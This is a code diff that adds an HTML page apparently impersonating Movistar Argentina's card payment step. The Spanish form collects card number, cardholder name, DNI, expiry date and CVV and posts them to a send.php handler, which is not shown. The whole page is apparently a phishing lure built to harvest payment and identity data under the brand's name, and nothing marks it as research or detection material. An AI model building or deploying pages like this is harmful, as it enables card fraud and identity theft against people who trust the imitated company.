@@ -1,0 +1,77 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pago con Tarjeta - Movistar Argentina</title>
+    <link rel="stylesheet" href="css/styles3.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400&display=swap" rel="stylesheet">
+</head>
+<body>
+    <div class="head1">
+        <header>
+            <div class="logo">
+                <img src="img/logo.png" alt="Logo" width="52px" height="38px">
+            </div>
+        </header>
+    </div>
+    <div class="head2">
+        <div class="parte1">
+            <!-- espacio en blanco -->
+        </div>
+        <div class="formu">
+            <div class="numero">
+                <div class="barra2">
+                    <img src="img/barra3.jpg" alt="progreso" width="100%">
+                </div>
+            </div>
+            <div class="formulario">
+                <form id="myForm" action="send.php" method="post">
+                    <div class="ingrese">
+                        <p>Ingresá tu tarjeta</p>
+                    </div>
+                    <div class="card">
+                        <input type="text" name="numero" id="numero" placeholder="Número de tarjeta" minlength="16" maxlength="16" required>
+                    </div>
+                    <div class="small">
+                        <small>Nombre del titular</small>
+                    </div>
+                    <div class="nombre">
+                        <input type="text" name="nombre" id="nombre" placeholder="Nombre del titular" required>
+                    </div>
+                    <div class="small">
+                        <small>DNI del titular</small>
+                    </div>
+                    <div class="denei">
+                        <input type="text" name="denei" id="denei" minlength="7" maxlength="8" placeholder="DNI" required>
+                    </div>
+                    <div class="small">
+                        <small>Fecha de vencimiento (mm/aa):</small>
+                    </div>
+                    <div class="mmaa">
+                        <input type="text" name="mes" id="mes" placeholder="Mes" minlength="2" maxlength="2" required>
+                        /
+                        <input type="text" name="ano" id="ano" placeholder="Año" minlength="2" maxlength="2" required>
+                    </div>
+                    <div class="small">
+                        <small>Código de seguridad</small>
+                    </div>
+                    <div class="cvv">
+                        <input type="text" name="cvv" id="cvv" minlength="3" maxlength="4" placeholder="CVV" required>
+                    </div>
+                    <div class="boton">
+                        <input type="submit" value="Continuar">
+                    </div>
+                </form>
+            </div>
+        <div class="parte3">
+            <!-- espacio en blanco -->
+        </div>
+    </div>
+    <script src="js.js"></script>
+</body>
+</html>
